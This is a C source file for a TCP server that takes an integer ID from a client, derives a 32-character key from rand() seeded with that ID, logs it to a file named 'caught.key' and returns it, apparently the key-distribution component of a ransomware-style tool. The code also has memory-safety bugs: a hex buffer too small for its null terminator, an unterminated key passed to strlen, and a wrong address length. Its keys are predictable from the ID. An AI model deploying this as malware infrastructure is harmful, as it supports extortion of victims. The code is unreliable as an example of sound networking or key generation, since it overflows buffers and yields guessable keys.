#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h> 
#include <netdb.h>
#define FILE_NAME "caught.key"
#define LENGTH 32
typedef int SOCKET;
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;
typedef struct in_addr IN_ADDR;

void save(int ID, char* key, char* hkey){
	FILE* f = fopen(FILE_NAME, "a+");
	if(f == NULL){
		perror("Fopen()");
	}
	fprintf(f,
			"--- Beginning : %d ---\n"
			"txt : %s\n"
			"hex : %s\n"
			"--- Ending ---\n"
			,ID,key, hkey);
	fclose(f);
}

int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
{
	for (size_t i = 0; i < size; i++) {
		hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
	}
	return 0;
}

char* gen_key(int ID){
	srand(ID);
	char element[] = "abcdef,?gh:;ijklmno=+~pqrstuvwxyz^^[]$*{})-_@";
	char* key = calloc(1,LENGTH);
	char hkey[LENGTH*2];
	int i;
	for(i = 0; i < LENGTH; i++){
		key[i] = element[rand()%strlen(element)];
	}
	bytes_to_hexa((unsigned char*)key, hkey, LENGTH);
	save(ID, key, hkey);
	return key;
}

void handleClients(SOCKET sock){

	// create client socket
	SOCKET csock;
	SOCKADDR_IN client = {0};
	int csinsize = sizeof csock;

	csock = accept(sock, (SOCKADDR*)&client, (__socklen_t *)&csinsize);
	if(csock == -1){
		perror("accept()");
		return;
	}
	// get data
	int ID;
	if(recv(csock, &ID, sizeof(int),0) == -1){
		printf("Failed to get the ID...\n");
		return;
	}
	printf("[+] Got the ID -> %d\n", ID);
	// gen key
	char* key = gen_key(ID);
	// send data
	if(send(csock, key, strlen(key),0) == -1){
		printf("[-]Failed sending the key to the Client!\n");
	} else {
		char *client_ip = inet_ntoa(client.sin_addr);
		int client_port = ntohs(client.sin_port);
		printf("Key sent on : %s:%d\n"
				,client_ip, client_port);
	}
	// close the socket
	close(csock);
}

int main(int argc, char **argv){
	// take the port to listen from argv
	int port;
	if(argc == 2){
		port = atoi(argv[1]);
	} else { // if not specified take the port 8080 by default
		port = 8080;
	}
	// create server socket + bind
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); // ip tcp 
	if (sock == -1) {
		perror("socket()");
		return 3;
	}
	SOCKADDR_IN sin = {0};
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_family = AF_INET; // ip addr 0.0.0.0 (all)
	sin.sin_port = htons(port); // port
	int flag = 1;
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));
	if(bind(sock, (SOCKADDR *)&sin, sizeof sin) == -1){
		perror("bind()");
		return 3;
	}
	// wait for client (max one)
	if(listen(sock, 1) == -1){
		perror("listen()");
		return 3;
	}
	printf("Listening on port %d\n", port);
	//printf("[+]Listening....\n");
	while(1) handleClients(sock);
	//printf("[-]Bye-bye Client!\n");
	close(sock);
	//printf("[-]Server closed with success!\n");
}
